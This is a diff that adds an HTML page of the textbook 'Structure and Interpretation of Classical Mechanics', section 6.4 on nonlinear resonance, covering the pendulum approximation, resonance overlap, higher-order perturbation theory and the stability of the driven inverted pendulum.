@@ -1,0 +1,551 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-74.html">previous</a></span><span>, <a href="book-Z-H-76.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_6.4"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_6.4">6.4&nbsp;&nbsp;Nonlinear Resonance</a></h2>
+<p><a name="%_idx_3044"></a><a name="%_idx_3046"></a></p>
+<p>
+We can develop an approximation for an isolated resonance region as
+follows.
+We again consider Hamiltonians of the form
+<a name="EQUATION_6.57"></a></p>
+<div align=left><img src="chap6-Z-G-66.gif" border="0"></div>
+<p>
+where <em>H</em><sub>0</sub>(<em>t</em>, <em>q</em>, <em>p</em>)  =  <img src="chap6-Z-G-D-1.gif" border="0"><sub>0</sub>(<em>p</em>) depends only on the momenta and so is
+solvable.  We assume
+that the Hamiltonian has no explicit time dependence.  We further
+assume that the coordinates are all angles, and that <em>H</em><sub>1</sub> is a
+multiply periodic function of the coordinates that can be written
+<a name="EQUATION_6.58"></a></p>
+<div align=left><img src="chap6-Z-G-67.gif" border="0"></div>
+<p></p>
+<p>
+Suppose we are interested in a region of phase space for which  <em>n</em>
+ &middot;  <img src="chap1-Z-G-D-23.gif" border="0"><sub>0</sub>(<em>p</em>)  is near zero, where <em>n</em> is a tuple of integers,
+one for each degree of freedom.  If we develop the perturbation
+theory as before with the generator <em>W</em> that eliminates all terms of
+order <img src="chap1-Z-G-D-12.gif" border="0">, then the transformed Hamiltonian is <em>H</em><sub>0</sub>, which is
+analytically solvable, but there would be terms with  <em>n</em>  &middot; 
+<img src="chap1-Z-G-D-23.gif" border="0"><sub>0</sub>(<em>p</em>)  in the denominator. The resulting solution is not
+applicable near this resonance.  </p>
+<p>
+Just as the problem of secular terms was solved by grouping more terms
+with the solvable part of the Hamiltonian, we can develop
+approximations that are valid in the resonance region by eliminating
+fewer terms and grouping more terms in the solvable part.</p>
+<p>
+To develop a perturbative approximation in the resonance region for which <em>n</em>
+ &middot;  <img src="chap1-Z-G-D-23.gif" border="0"><sub>0</sub>(<em>p</em>) is near zero, we take the generator <em>W</em> to&nbsp;be
+<a name="EQUATION_6.59"></a></p>
+<div align=left><img src="chap6-Z-G-68.gif" border="0"></div>
+<p>
+excluding terms in <em>W</em> that lead to small denominators in this region.
+The transformed Hamiltonian is
+<a name="EQUATION_6.60"></a></p>
+<div align=left><img src="chap6-Z-G-69.gif" border="0"></div>
+<p>
+where the additional terms are higher-order in <img src="chap1-Z-G-D-12.gif" border="0">.  By
+excluding the term <em>k</em> = <em>n</em> from the sum in the generating function, that 
+term is left after the transformation.</p>
+<p>
+The transformed Hamiltonian depends only on a single combination of
+angles, so a change of variables can be made so that the new
+transformed Hamiltonian is cyclic in all but one coordinate, which is
+this combination of angles.  This transformed Hamiltonian is solvable
+(reducible to quadratures).</p>
+<p>
+For example, suppose there are two degrees of freedom <img src="chap1-Z-G-D-19.gif" border="0">  = 
+(<img src="chap1-Z-G-D-19.gif" border="0"><sub>1</sub>, <img src="chap1-Z-G-D-19.gif" border="0"><sub>2</sub>) and we are interested in a region of phase space
+in which <em>n</em>  &middot;  <img src="chap1-Z-G-D-23.gif" border="0"><sub>0</sub> is near zero, with <em>n</em>  =  (<em>n</em><sub>1</sub>, <em>n</em><sub>2</sub>).  The
+combination of angles <em>n</em>  &middot;  <img src="chap1-Z-G-D-19.gif" border="0"> is slowly varying in the
+resonance region.  The transformed
+Hamiltonian&nbsp;(<a href="#EQUATION_6.60">6.60</a>) is of the
+form
+<a name="EQUATION_6.61"></a></p>
+<div align=left><img src="chap6-Z-G-70.gif" border="0"></div>
+<p>
+We can transform variables to <img src="chap3-Z-G-D-5.gif" border="0">  =  <em>n</em><sub>1</sub> <img src="chap1-Z-G-D-19.gif" border="0"><sub>1</sub>  +  <em>n</em><sub>2</sub> <img src="chap1-Z-G-D-19.gif" border="0"><sub>2</sub>,
+with second coordinate, say, <img src="chap1-Z-G-D-19.gif" border="0">'  =  <img src="chap1-Z-G-D-19.gif" border="0"><sub>2</sub>.<a name="call_footnote_Temp_427" href="#footnote_Temp_427"><sup><small>2</small></sup></a>    
+Using the <em>F</em><sub>2</sub>-type generating function
+<a name="EQUATION_6.62"></a></p>
+<div align=left><img src="chap6-Z-G-71.gif" border="0"></div>
+<p>
+we find that
+the transformation is 
+<a name="EQUATION_6.63"></a></p>
+<div align=left><img src="chap6-Z-G-72.gif" border="0"></div>
+<p>
+In these variables the transformed resonance Hamiltonian <em>H</em>'<sub><em>n</em></sub> becomes
+<a name="EQUATION_6.64"></a></p>
+<div align=left><img src="chap6-Z-G-73.gif" border="0"></div>
+<p>
+This Hamiltonian is cyclic in <img src="chap1-Z-G-D-19.gif" border="0">', so <img src="chap5-Z-G-D-15.gif" border="0">' is constant.
+With this constant momentum, the Hamiltonian for the conjugate pair
+(<img src="chap3-Z-G-D-5.gif" border="0">, <img src="chap5-Z-G-D-5.gif" border="0">) has one degree of freedom.  The solutions are level
+curves of the Hamiltonian.  These solutions, reexpressed in
+terms of the original phase-space coordinates, give the
+evolution of <em>H</em>'<sub><em>n</em></sub>.
+An approximate solution in the resonance region is therefore
+<a name="EQUATION_6.65"></a></p>
+<div align=left><img src="chap6-Z-G-74.gif" border="0"></div>
+<p></p>
+<p>
+If the resonance regions are sufficiently separated, then a global
+solution can be constructed by splicing together such solutions for
+each resonance region.</p>
+<p>
+</p>
+<a name="%_sec_6.4.1"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_6.4.1">6.4.1&nbsp;&nbsp;Pendulum Approximation</a></h3>
+<p>The resonance Hamiltonian&nbsp;(<a href="#EQUATION_6.64">6.64</a>)
+has a single degree of freedom and is therefore solvable (reducible to
+quadratures).  We can develop an approximate analytic solution in the
+vicinity of the resonance by making use of the fact that the solution
+is valid there.  The resonance Hamiltonian can be approximated by a
+generalized pendulum Hamiltonian.</p>
+<p>
+Let 
+<a name="EQUATION_6.66"></a></p>
+<div align=left><img src="chap6-Z-G-75.gif" border="0"></div>
+<p>
+and
+<a name="EQUATION_6.67"></a></p>
+<div align=left><img src="chap6-Z-G-76.gif" border="0"></div>
+<p>
+then the resonance Hamiltonian is
+<a name="EQUATION_6.68"></a></p>
+<div align=left><img src="chap6-Z-G-77.gif" border="0"></div>
+<p></p>
+<p>
+Define the <a name="%_idx_3048"></a>resonance center <img src="chap5-Z-G-D-5.gif" border="0"><sub><em>n</em></sub> by the requirement that the
+resonance frequency be zero there:
+<a name="EQUATION_6.69"></a></p>
+<div align=left><img src="chap6-Z-G-78.gif" border="0"></div>
+<p>
+Now expand both parts of the resonance Hamiltonian about the resonance center:
+<a name="EQUATION_6.70"></a></p>
+<div align=left><img src="chap6-Z-G-79.gif" border="0"></div>
+<p>
+and
+<a name="EQUATION_6.71"></a></p>
+<div align=left><img src="chap6-Z-G-80.gif" border="0"></div>
+<p>
+The first term in the expansion of <em>H</em>''<sub><em>n</em>,0</sub> is a constant and can
+be ignored.  The coefficient of the second term is zero, from the
+definition of <img src="chap5-Z-G-D-5.gif" border="0"><sub><em>n</em></sub>.  The third term is the first significant term.  
+We presume here that the first term of <em>H</em>''<sub><em>n</em>,1</sub> is a nonzero constant.
+Now the scale of the separatrix in <img src="chap5-Z-G-D-5.gif" border="0"> at resonance is typically
+proportional to (<img src="chap1-Z-G-D-12.gif" border="0">)<sup>1/2</sup>.  So the third term of <em>H</em>''<sub><em>n</em>,0</sub>
+and the first term of <em>H</em>''<sub><em>n</em>,1</sub> are both proportional to <img src="chap1-Z-G-D-12.gif" border="0">.
+Subsequent terms are higher-order in <img src="chap1-Z-G-D-12.gif" border="0">.  Keeping only the
+order-<img src="chap1-Z-G-D-12.gif" border="0"> terms, the approximate resonance Hamiltonian is of the form
+<a name="EQUATION_6.72"></a></p>
+<div align=left><img src="chap6-Z-G-81.gif" border="0"></div>
+<p>
+which is the Hamiltonian for a pendulum with a shifted center in
+momentum.  This is analytically solvable.</p>
+<p>
+</p>
+<a name="%_sec_Temp_428"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_428">Driven pendulum resonances</a></h4>
+<p><a name="%_idx_3050"></a><a name="%_idx_3052"></a></p>
+<p>
+Consider the behavior of the  periodically driven
+pendulum in the vicinity of the resonance <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  =  <img src="chap1-Z-G-D-23.gif" border="0">.</p>
+<p>
+The Hamiltonian&nbsp;(<a href="#EQUATION_6.54">6.54</a>) for the driven
+pendulum has three resonance terms in <em>H</em><sub>1</sub>.  The full
+generator&nbsp;(<a href="#EQUATION_6.56">6.56</a>) has three terms that are
+designed to eliminate the corresponding resonance terms in the
+Hamiltonian.  The resulting approximate solution has small
+denominators close to each of the three resonances,
+<img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  =  0, <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  =  <img src="chap1-Z-G-D-23.gif" border="0">, and
+<img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  =   <tt>-</tt> <img src="chap1-Z-G-D-23.gif" border="0">.</p>
+<p>
+To develop a resonance approximation near <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  =  <img src="chap1-Z-G-D-23.gif" border="0">, we
+do not include the corresponding term in the generator, so that the
+corresponding term is left in the Hamiltonian.  It is helpful to give names to the
+various terms in the full generator&nbsp;(<a href="#EQUATION_6.56">6.56</a>):
+<a name="EQUATION_6.73"></a></p>
+<div align=left><img src="chap6-Z-G-82.gif" border="0"></div>
+<p>
+The full generator is <em>W</em><sup>0</sup>  +  <em>W</em><sup><tt>-</tt></sup>  +  <em>W</em><sup>+</sup>.</p>
+<p>
+To investigate the motion in the phase space near the resonance
+<img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  =  <img src="chap1-Z-G-D-23.gif" border="0"> (the &quot;+&quot; resonance), we use the generator that
+excludes the corresponding term
+<a name="EQUATION_6.74"></a></p>
+<div align=left><img src="chap6-Z-G-83.gif" border="0"></div>
+<p>
+With this generator the transformed Hamiltonian is
+<a name="EQUATION_6.75"></a></p>
+<div align=left><img src="chap6-Z-G-84.gif" border="0"></div>
+<p> </p>
+<p>
+After we exclude the higher-order terms, this Hamiltonian has only a single
+combination of coordinates, and so can be transformed into a
+Hamiltonian that is cyclic in all but one degree of freedom.  Define
+the transformation through the mixed-variable generating function
+<a name="EQUATION_6.76"></a></p>
+<div align=left><img src="chap6-Z-G-85.gif" border="0"></div>
+<p>
+giving the transformation 
+<a name="EQUATION_6.77"></a></p>
+<div align=left><img src="chap6-Z-G-86.gif" border="0"></div>
+<p>
+Expressed in these new coordinates, the resonance Hamiltonian is
+<a name="EQUATION_6.78"></a></p>
+<div align=left><img src="chap6-Z-G-87.gif" border="0"></div>
+<p>
+This Hamiltonian is cyclic in <em>t</em>', so the solutions are level curves
+of <em>H</em><sub>+</sub>' in (<img src="chap3-Z-G-D-5.gif" border="0">, <img src="chap5-Z-G-D-5.gif" border="0">).  Actually, more can be said here
+because <em>H</em><sub>+</sub>' is already of the form of a pendulum shifted in the <img src="chap5-Z-G-D-5.gif" border="0">
+direction by <img src="chap1-Z-G-D-21.gif" border="0"> <img src="chap1-Z-G-D-23.gif" border="0"> and shifted by <img src="chap1-Z-G-D-15.gif" border="0"> in phase.  The
+shift by <img src="chap1-Z-G-D-15.gif" border="0"> comes about because the sign of the cosine term is
+positive, rather than negative as in the usual pendulum.  A sketch of
+the level curves is given in figure&nbsp;<a href="#FIGURE_6.8">6.8</a>.</p>
+<p>
+<a name="FIGURE_6.8"></a></p>
+<div align=left><img src="chap6-Z-G-88.gif" border="0"></div>
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_6.2"></a>
+<b>Exercise 6.2.</b>&nbsp;&nbsp;<strong>Resonance width</strong><br>
+<a name="%_idx_3054"></a>Verify that the half-width of the resonance region is 2 (<img src="chap1-Z-G-D-21.gif" border="0">
+<img src="chap1-Z-G-D-1.gif" border="0"> <img src="chap1-Z-G-D-12.gif" border="0">)<sup>1/2</sup>.
+</p>
+
+<p></p>
+<p>
+</p>
+<p><a name="%_thm_6.3"></a>
+<b>Exercise 6.3.</b>&nbsp;&nbsp;<strong>With the computer</strong><br>
+Verify, with the computer, that with the generator <em>W</em><sub>+</sub> the
+transformed Hamiltonian is given by equation&nbsp;(<a href="#EQUATION_6.75">6.75</a>).
+</p>
+
+<p></p>
+<p>
+An approximate solution of the driven pendulum near the <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  = 
+<img src="chap1-Z-G-D-23.gif" border="0"> resonance is 
+<a name="EQUATION_6.79"></a></p>
+<div align=left><img src="chap6-Z-G-89.gif" border="0"></div>
+<p>
+To find out to what extent the approximate solution models the actual
+driven pendulum, we make a <a name="%_idx_3056"></a><a name="%_idx_3058"></a><a name="%_idx_3060"></a><a name="%_idx_3062"></a><a name="%_idx_3064"></a>surface of section using this approximate
+solution and compare it to a surface of section for the actual driven
+pendulum.  The surface of section for the approximate solution in the
+resonance region is shown in figure&nbsp;<a href="#FIGURE_6.9">6.9</a>.  A
+surface of section for the actual driven pendulum is shown in the lower part of 
+figure&nbsp;<a href="#FIGURE_6.10">6.10</a>.  The correspondence is surprisingly
+good.
+Note how the resonance island is not symmetrical about a
+line of constant momentum.  The resonance Hamiltonian is symmetrical
+about <img src="chap5-Z-G-D-5.gif" border="0">  =  <img src="chap1-Z-G-D-21.gif" border="0"> <img src="chap1-Z-G-D-23.gif" border="0">, and by itself would give a
+symmetric resonance island (see figure&nbsp;<a href="#FIGURE_6.8">6.8</a>).  The necessary distortion is introduced by
+the <em>W</em><sup>+</sup> transformation that eliminates the other resonances.
+Indeed, in the full section the distortion appears to be generated by
+the nearby <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  =  0 resonance ``pushing away'' nearby
+features so that it has room to fit.
+However, some features of the actual section are not represented;
+for instance, there is a small <a name="%_idx_3066"></a><a name="%_idx_3068"></a>chaotic zone near the actual
+separatrix.  </p>
+<p>
+<a name="FIGURE_6.9"></a></p>
+<div align=left><img src="chap6-Z-G-90.gif" border="0"></div>
+<p></p>
+<p>
+<a name="FIGURE_6.10"></a></p>
+<div align=left><img src="chap6-Z-G-91.gif" border="0"></div>
+<p></p>
+<p>
+
+The perturbation solution near the <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  =  0 resonance merges
+smoothly with the perturbation solutions for the <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  = 
+<img src="chap1-Z-G-D-23.gif" border="0"> and <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  =   <tt>-</tt> <img src="chap1-Z-G-D-23.gif" border="0"> resonances.  We can make a
+composite perturbative solution by using the appropriate resonance
+solution for each region of phase space.  A surface of section for the
+composite perturbative solution is shown in the upper part of 
+figure&nbsp;<a href="#FIGURE_6.10">6.10</a>, as is
+the corresponding surface of section for the actual driven pendulum.
+The perturbative solution
+captures many features seen on the actual section.  
+However, the first-order perturbative solution does not capture the
+resonant islands between the two primary resonances or the secondary
+island chains contained within a primary resonance region.  Also, the
+first-order perturbative solution does not show the chaotic zone near
+the separatrix apparent in the surface of section for the actual
+driven pendulum.</p>
+<p>
+We see, from the comparisons of the sections of the first-order
+perturbative solutions for the various resonance regions, that the
+section for the actual driven pendulum can be approximately
+constructed by combining the approximations developed for each
+resonance.  The shapes of the resonance regions are distorted by the
+transformations that eliminate the nearby resonances, so the resulting
+pieces fit together consistently.  The predicted width of each
+resonance region agrees with the actual width: it is not
+substantially changed by the distortion of the region introduced by
+the elimination of the other resonance terms.  Not all the features of
+the actual section are reproduced in this composite of first-order 
+approximations: there are chaotic zones and islands that do not
+appear in this collage of first-order approximations.</p>
+<p>
+For larger drives, the approximations derived by first-order
+perturbations are worse.  In the lower part of figure&nbsp;<a href="#FIGURE_6.11">6.11</a>, with
+drive larger by a factor of five we lose the <a name="%_idx_3070"></a><a name="%_idx_3072"></a>invariant curves that separate
+the resonance regions.  The main resonance islands persist, but the <a name="%_idx_3074"></a><a name="%_idx_3076"></a>chaotic
+zones near the separatrices have merged into one large chaotic sea.</p>
+<p>
+<a name="FIGURE_6.11"></a></p>
+<div align=left><img src="chap6-Z-G-92.gif" border="0"></div>
+<p></p>
+<p>
+The composite first-order perturbative solution for the more strongly driven
+pendulum in the upper part of figure&nbsp;<a href="#FIGURE_6.11">6.11</a> still approximates the
+centers of the main resonance islands reasonably well, but it fails as
+we move out and encounter the secondary islands that are visible in
+the resonance region for <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>) = <img src="chap1-Z-G-D-23.gif" border="0">.  Here the
+approximations for the two regions do not fit together so well.  The
+chaotic sea is found in the region where the perturbative solutions do
+not match.</p>
+<p>
+</p>
+<a name="%_sec_6.4.2"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_6.4.2">6.4.2&nbsp;&nbsp;Reading the Hamiltonian</a></h3>
+<p>The locations and widths of the primary <a name="%_idx_3078"></a><a name="%_idx_3080"></a><a name="%_idx_3082"></a>resonance islands can often be
+read straight off the Hamiltonian when expressed as a Poisson series.
+For each term in the series for the perturbation there is a
+corresponding resonance island.  The width of the island can often be
+simply computed from the coefficients in the Hamiltonian.  So just by
+looking at the Hamiltonian we can get a good idea of what sort of
+behavior we will see on the surface of section.  For instance, in
+the driven pendulum, the
+Hamiltonian&nbsp;(<a href="#EQUATION_6.53">6.53</a>) has three
+terms.  We could anticipate, just from looking at the Hamiltonian,
+that three main resonance islands are to be found on the surface
+of section.  We know that these <a name="%_idx_3084"></a><a name="%_idx_3086"></a>islands will be located where the
+resonant combination of angles is slow.  So for the periodically
+driven pendulum the resonances occur near <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  =  <img src="chap1-Z-G-D-23.gif" border="0">,
+<img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  =  0, and <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  =   <tt>-</tt> <img src="chap1-Z-G-D-23.gif" border="0">.  The approximate widths
+of the resonance islands can be computed with a simple calculation.</p>
+<p>
+</p>
+<a name="%_sec_6.4.3"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_6.4.3">6.4.3&nbsp;&nbsp;Resonance-Overlap Criterion</a></h3>
+<p><a name="%_idx_3088"></a></p>
+<p>
+As the size of the drive increases, the chaotic zones near the
+separatrices get larger and then merge into a large chaotic sea.  The
+resonance-overlap criterion gives an analytic estimate of when this
+occurs.  The basic idea is to compare the sum of the <a name="%_idx_3090"></a>widths of
+neighboring resonances with their separation.  If the sum of the
+half-widths is greater than the separation, then the resonance-overlap
+criterion predicts there will be large-scale <a name="%_idx_3092"></a>chaotic behavior near the
+overlapping resonances.  In the case of the periodically driven
+pendulum, the half-width of the <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  =  0 resonance is
+2 (<img src="chap1-Z-G-D-21.gif" border="0"> <i>&szlig;</i>)<sup>1/2</sup> and the half-width of the
+<img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)   =  <img src="chap1-Z-G-D-23.gif" border="0">  resonance is 2 (<img src="chap1-Z-G-D-21.gif" border="0"> <img src="chap1-Z-G-D-1.gif" border="0">)<sup>1/2</sup> (see
+figure&nbsp;<a href="#FIGURE_6.12">6.12</a>).  The
+separation of the resonances is <img src="chap1-Z-G-D-21.gif" border="0"> <img src="chap1-Z-G-D-23.gif" border="0">.  So resonance overlap
+occurs if
+<a name="EQUATION_6.80"></a></p>
+<div align=left><img src="chap6-Z-G-93.gif" border="0"></div>
+<p>
+The amplitude of the drive enters through <img src="chap1-Z-G-D-1.gif" border="0">.  Solving, we
+find the value of <img src="chap1-Z-G-D-1.gif" border="0"> above which resonance overlap occurs.
+For the parameters <img src="chap1-Z-G-D-21.gif" border="0">  =  <i>&szlig;</i>  =  1, <img src="chap1-Z-G-D-23.gif" border="0">  =  5 used in 
+figures&nbsp;<a href="#FIGURE_6.9">6.9</a>-<a href="#FIGURE_6.11">6.11</a>,
+the resonance overlap value of <img src="chap1-Z-G-D-1.gif" border="0"> is 9/4.  We see that,
+in fact, the chaotic zones have already merged for <img src="chap1-Z-G-D-1.gif" border="0">  =  5/4.  So
+in this case the resonance-overlap criterion overestimates the
+strength of the resonances required to get large-scale
+chaotic behavior.  This is typical of the resonance-overlap criterion.</p>
+<p>
+
+A way of thinking about why the resonance-overlap criterion usually
+overestimates the strength required to get large-scale chaos is that
+other effects must be taken into account.  For
+instance, as the drive is increased second-order resonances appear
+between the primary resonances; these resonances take up space and so
+resonance overlap occurs for smaller drive than would be expected by
+considering the primary resonances alone.  Also, the chaotic zones at
+each separatrix have area that must be accounted for.</p>
+<p>
+<a name="FIGURE_6.12"></a></p>
+<div align=left><img src="chap6-Z-G-94.gif" border="0"></div>
+<p></p>
+<p>
+</p>
+<a name="%_sec_6.4.4"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_6.4.4">6.4.4&nbsp;&nbsp;Higher-Order Perturbation Theory</a></h3>
+<p><a name="%_idx_3094"></a><a name="%_idx_3096"></a></p>
+<p>
+As the drive is increased, a variety of new islands emerge, which are
+not evident in the original Hamiltonian.  To find approximations for
+motion in these regions we can use higher-order perturbation theory.
+The basic plan is the same as before.  At any stage the Hamiltonian
+(which is perhaps a result of earlier stages of perturbation theory)
+is expressed as a Poisson series (a multiple-angle Fourier series).
+The terms that are not resonant in a region of interest are eliminated
+by a Lie transformation.  The remaining resonance terms involve only a
+single combination of angle and are thus solvable by making a canonical
+transformation to resonance coordinates.  We complete the solution and
+transform back to the original coordinates.</p>
+<p>
+Let's find a perturbative approximation for the second-order islands
+visible in figure&nbsp;<a href="#FIGURE_6.10">6.10</a> between the <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  = 
+0 resonance and the <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>r</em></sub>(<em>p</em>)  =   <tt>-</tt> <img src="chap1-Z-G-D-23.gif" border="0"> resonance.  The details
+are messy, so we will just give a few intermediate results.  </p>
+<p>
+This resonance is not near the three primary resonances, so we can use
+the full generator&nbsp;(<a href="#EQUATION_6.56">6.56</a>) to eliminate those
+three primary resonance terms from the Hamiltonian.  After this
+perturbation step the Hamiltonian is too hairy to look at.</p>
+<p>
+We expand the transformed Hamiltonian in Poisson form and divide the
+terms into those that are resonant and those that are not.  The terms
+that are not resonant can be eliminated by a Lie transform.  This Lie
+transform leaves the resonant terms in the Hamiltonian and introduces
+an additional distortion to the curves on the surface of section.
+In this case this latter distortion is small, but very messy to
+compute, so we will just not include this effect.  The resonance
+Hamiltonian is then (after considerable algebra)
+<a name="EQUATION_6.81"></a></p>
+<div align=left><img src="chap6-Z-G-95.gif" border="0"></div>
+<p>
+This is solvable because there is only a single combination of
+coordinates.</p>
+<p>
+We can get an analytic solution by making the pendulum
+approximation.  The Hamiltonian is already quadratic in the momentum
+<em>p</em>, so all we need to do is evaluate the coefficient of the potential
+terms at the resonance center <em>p</em><sub>2:1</sub>  =  <img src="chap1-Z-G-D-21.gif" border="0"> <img src="chap1-Z-G-D-23.gif" border="0"> / 2.  The
+resonance Hamiltonian, in the pendulum approximation, is 
+<a name="EQUATION_6.82"></a></p>
+<div align=left><img src="chap6-Z-G-96.gif" border="0"></div>
+<p>
+Carrying out the transformation to the resonance variable <img src="chap3-Z-G-D-5.gif" border="0">  =  2
+<img src="chap1-Z-G-D-19.gif" border="0">  <tt>-</tt>  <img src="chap1-Z-G-D-23.gif" border="0"> <em>t</em> reduces this to a pendulum Hamiltonian with a
+single degree of freedom.   Combining  the analytic solution of this
+pendulum Hamiltonian with the transformations generated by the full
+<em>W</em>, we get an approximate perturbative solution
+<a name="EQUATION_6.83"></a></p>
+<div align=left><img src="chap6-Z-G-97.gif" border="0"></div>
+<p>
+A surface of section in the appropriate resonance region using this
+solution is shown in figure&nbsp;<a href="#FIGURE_6.13">6.13</a>.  Comparing
+this to the actual surface of section
+(figure&nbsp;<a href="#FIGURE_6.10">6.10</a>), we see that the approximate
+solution provides a good representation of this resonance motion.</p>
+<p>
+<a name="FIGURE_6.13"></a></p>
+<div align=left><img src="chap6-Z-G-98.gif" border="0"></div>
+<p></p>
+<p>
+</p>
+<a name="%_sec_6.4.5"></a>
+<h3><a href="book-Z-H-4.html#%_toc_%_sec_6.4.5">6.4.5&nbsp;&nbsp;Stability of the Inverted Vertical Equilibrium</a></h3>
+<p><a name="%_idx_3098"></a><a name="%_idx_3100"></a><a name="%_idx_3102"></a></p>
+<p>
+As a second application, we use second-order perturbation theory to
+investigate the inverted vertical equilibrium of the periodically
+driven pendulum.</p>
+<p>
+Here, the procedure parallels that just followed, but we focus
+on a different set of resonance terms.  The terms that are slowly
+varying for the vertical equilibrium are those that involve <img src="chap1-Z-G-D-19.gif" border="0">
+but do not involve <em>t</em>, such as cos (<img src="chap1-Z-G-D-19.gif" border="0">) and cos (2 <img src="chap1-Z-G-D-19.gif" border="0">).
+So we want to use the generator <em>W</em><sup>+</sup>  +  <em>W</em><sup><tt>-</tt></sup> that eliminates the
+nonresonant terms involving combinations of <img src="chap1-Z-G-D-19.gif" border="0"> and <img src="chap1-Z-G-D-23.gif" border="0"> <em>t</em>,
+while leaving the central resonance.  After the Lie transform of the
+Hamiltonian with this generator, we write the transformed Hamiltonian
+as a Poisson series and collect the resonant terms.  The transformed
+resonance Hamiltonian is
+<a name="EQUATION_6.84"></a></p>
+<div align=left><img src="chap6-Z-G-99.gif" border="0"></div>
+<p>
+Figure&nbsp;<a href="#FIGURE_6.14">6.14</a> shows contours of this
+resonance Hamiltonian <em>H</em>'<sub><em>V</em></sub> and
+a surface of section for the actual driven pendulum for the same
+parameters.  The behavior of the resonance Hamiltonian is
+indistinguishable from that of the actual driven pendulum.  The theory
+does especially well here; there are no nearby resonances
+because the drive frequency is high.</p>
+<p>
+<a name="FIGURE_6.14"></a></p>
+<div align=left><img src="chap6-Z-G-100.gif" border="0"></div>
+<p></p>
+<p>
+We can get an analytic estimate for the stability of the inverted
+vertical equilibrium by carrying out a linear stability analysis of
+the resonance Hamiltonian of the fixed point <img src="chap1-Z-G-D-19.gif" border="0"> = <img src="chap1-Z-G-D-15.gif" border="0">, <em>p</em> = 0.  The
+algebra is somewhat simpler if we first make the pendulum
+approximation about the resonance center.  The resonance Hamiltonian
+is then approximately
+<a name="EQUATION_6.85"></a></p>
+<div align=left><img src="chap6-Z-G-101.gif" border="0"></div>
+<p>
+Linear stability analysis of the inverted vertical equilibrium indicates
+stability for
+<a name="EQUATION_6.86"></a></p>
+<div align=left><img src="chap6-Z-G-102.gif" border="0"></div>
+<p>
+In terms of the original physical parameters, the vertical
+equilibrium is linearly stable if
+<a name="EQUATION_6.87"></a></p>
+<div align=left><img src="chap6-Z-G-103.gif" border="0"></div>
+<p>
+where <img src="chap1-Z-G-D-23.gif" border="0"><sub><em>s</em></sub>  =  (<em>g</em>/<em>l</em>)<sup>1/2</sup>, the small-amplitude oscillation frequency.  For the vertical equilibrium to be
+stable, the scaled product of the amplitude of the drive and the drive
+frequency must be sufficiently large.</p>
+<p>
+<a name="FIGURE_6.15"></a></p>
+<div align=left><img src="chap6-Z-G-104.gif" border="0"></div>
+<p></p>
+<p>
+This analytic estimate is compared with the behavior of the driven
+pendulum in figure&nbsp;<a href="#FIGURE_6.15">6.15</a>.  For any given
+assignment of the parameters, the driven pendulum can be tested for the
+<a name="%_idx_3104"></a>linear stability of the inverted vertical equilibrium by the methods
+of chapter&nbsp;<a href="book-Z-H-48.html#%_chap_4">4</a>; this
+involves determining the roots of the characteristic polynomial for a
+reference orbit at the resonance center.  In the figure the stability
+of the inverted vertical equilibrium was assessed at each point of a
+grid of assignments of the parameters.  A dot is shown for
+combinations of parameters that are linearly stable.  The
+diagonal line is the analytic boundary of the region of stability of
+the inverted equilibrium: (<img src="chap1-Z-G-D-23.gif" border="0">/<img src="chap1-Z-G-D-23.gif" border="0"><sub><em>s</em></sub>)(<em>A</em>/<em>l</em>)  =  (2)<sup>1/2</sup>.  We see
+that the boundary of the region of stability is well approximated by
+the analytic estimate derived from perturbation theory.  Note that
+for very high drive amplitudes there is another region of instability,
+which is not captured by this perturbation analysis.</p>
+<p>
+
+
+</p>
+<div class=smallprint><hr></div>
+<p></p>
+<div class=footnote>
+<p><a name="footnote_Temp_427" href="#call_footnote_Temp_427"><sup><small>2</small></sup></a> Any linearly independent combination will be acceptable
+here.</p>
+</div>
